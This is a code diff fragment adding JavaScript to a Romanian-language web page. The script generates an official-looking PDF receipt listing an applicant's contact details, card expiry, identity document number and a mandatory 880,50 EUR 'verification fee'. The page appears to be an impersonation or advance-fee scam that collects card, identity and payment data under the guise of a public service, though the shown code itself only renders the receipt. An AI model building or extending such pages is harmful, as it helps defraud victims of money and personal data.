+    if(y+height>pageHeight-25) newPage();
+  }
+  function section(title){
+    ensureSpace(13);
+    pdf.setTextColor(11,58,110);
+    pdf.setFont('helvetica','bold');
+    pdf.setFontSize(11);
+    pdf.text(pdfText(title).toUpperCase(),margin,y);
+    pdf.setDrawColor(212,222,234);
+    pdf.line(margin,y+2,pageWidth-margin,y+2);
+    y+=9;
+  }
+  function row(label,value){
+    var valueLines=pdf.splitTextToSize(pdfText(value),pageWidth-margin-72-margin);
+    var rowHeight=Math.max(8,valueLines.length*4.5+3);
+    ensureSpace(rowHeight);
+    pdf.setFontSize(9);
+    pdf.setFont('helvetica','bold');
+    pdf.setTextColor(100,116,139);
+    pdf.text(pdfText(label),margin,y+3.5);
+    pdf.setFont('helvetica','normal');
+    pdf.setTextColor(23,32,51);
+    pdf.text(valueLines,72,y+3.5);
+    pdf.setDrawColor(235,239,244);
+    pdf.line(margin,y+rowHeight,pageWidth-margin,y+rowHeight);
+    y+=rowHeight;
+  }
+
+  drawHeader();
+  pdf.setFillColor(248,250,252);
+  pdf.roundedRect(margin,39,pageWidth-margin*2,29,2,2,'F');
+  pdf.setDrawColor(210,215,220);
+  pdf.roundedRect(margin,39,pageWidth-margin*2,29,2,2,'S');
+  pdf.setTextColor(11,58,110);
+  pdf.setFont('helvetica','bold');
+  pdf.setFontSize(8.5);
+  pdf.text('IDENTIFICAREA DOSARULUI',margin+6,45);
+  pdf.setTextColor(100,116,139);
+  pdf.setFont('helvetica','normal');
+  pdf.setFontSize(7.5);
+  pdf.text('NUMAR DE PROTOCOL',margin+6,52);
+  pdf.setTextColor(11,58,110);
+  pdf.setFont('helvetica','bold');
+  pdf.setFontSize(14);
+  pdf.text(lastSubmission.protocol,margin+6,61);
+  pdf.setTextColor(60,60,60);
+  pdf.setFont('helvetica','normal');
+  pdf.setFontSize(8);
+  pdf.text('Data si ora: '+lastSubmission.date.toLocaleString('ro-RO'),110,51);
+  pdf.text('Stare: Cerere inregistrata',110,57);
+  pdf.text('Serviciu: '+pdfText(lastSubmission.service),110,63);
+  y=78;
+
+  section('Date solicitant');
+  row('Nume complet',lastSubmission.applicant);
+  row('E-mail',lastSubmission.email);
+  row('Telefon',lastSubmission.phone);
+  row('Adresa',lastSubmission.address);
+
+  section('Detalii card & Identitate');
+  row('Card digital', '**** **** **** ' + lastSubmission.cardNumber.slice(-4));
+  row('Expirare card', lastSubmission.cardExpiry);
+  row('Tip document', lastSubmission.documentType);
+  row('Numar document', lastSubmission.documentNumber);
+
+  section('Plata taxei');
+  row('Taxa de verificare', '880,50 EUR');
+  row('Referinta tranzactie', lastSubmission.transactionRef);
+  row('Chitanta atasata', lastSubmission.receiptFile);
+
+  section('Politica de confidentialitate si conditii');
+  var privacyTexts = [
+    "Prin depunerea acestei cereri, confirmati ca ati luat cunostinta de prevederile legale privind protectia datelor cu caracter personal si prelucrarea acestora.",
+    "1. Datele furnizate sunt utilizate exclusiv pentru procesarea prezentei cereri si pentru comunicarile oficiale legate de aceasta.",
+    "2. Datele personale sunt tratate in conformitate cu Regulamentul (UE) 2016/679 (GDPR) si cu legislatia nationala in vigoare.",
+    "3. Solicitantul are dreptul de acces, rectificare, stergere si opozitie la prelucrarea datelor personale, in conditiile prevazute de lege.",
+    "4. Toate taxele, tarifele si costurile solicitate in cadrul acestei proceduri sunt in responsabilitatea exclusiva a solicitantului.",
+    "5. Achitarea taxelor este OBLIGATORIE pentru buna desfasurare a cererii. Neplata taxelor atrage dupa sine respingerea cererii.",
+    "6. Cererea va fi procesata numai dupa confirmarea platii taxelor aferente."
+  ];
+
+  pdf.setFont('helvetica','normal');
+  pdf.setFontSize(8.5);
+  pdf.setTextColor(50,60,75);
+
+  privacyTexts.forEach(function(lineText) {
+    var splitLine = pdf.splitTextToSize(pdfText(lineText), pageWidth - margin * 2 - 8);
+    ensureSpace(splitLine.length * 4.5 + 2);
+    pdf.text(splitLine, margin + 4, y + 3);
+    y += splitLine.length * 4.5 + 2;
+  });
+
+  y += 4;
+  ensureSpace(12);
+  pdf.setFont('helvetica','italic');
+  pdf.setFontSize(7.5);
+  pdf.setTextColor(100,116,139);
+  var finalMention = pdf.splitTextToSize(pdfText("Document generat automat de platforma AVR · Termen de raspuns: 30 de zile lucrătoare · Toate taxele sunt obligatorii pentru procesarea cererii."), pageWidth - margin * 2);
+  pdf.text(finalMention, pageWidth / 2, y, { align: 'center' });
+
+  var totalPages=pdf.internal.getNumberOfPages();
+  for(var page=1;page<=totalPages;page++){
+    pdf.setPage(page);
+    drawFooter(page,totalPages);
+  }
+  pdf.save(lastSubmission.protocol+'.pdf');
+};
+window.printReceipt=function(){window.print();};
+
+var menuButton=document.getElementById('menuBtn');
+menuButton.addEventListener('click',function(){
+  var nav=document.getElementById('mainNav');
+  var open=nav.classList.toggle('open');
+  menuButton.setAttribute('aria-expanded',String(open));
+});
+document.querySelectorAll('#mainNav a').forEach(function(link){
+  link.addEventListener('click',function(){document.getElementById('mainNav').classList.remove('open');});
+});
+renderUploads();
+renderProgress();
+})();
+</script>
+</body>
+</html>
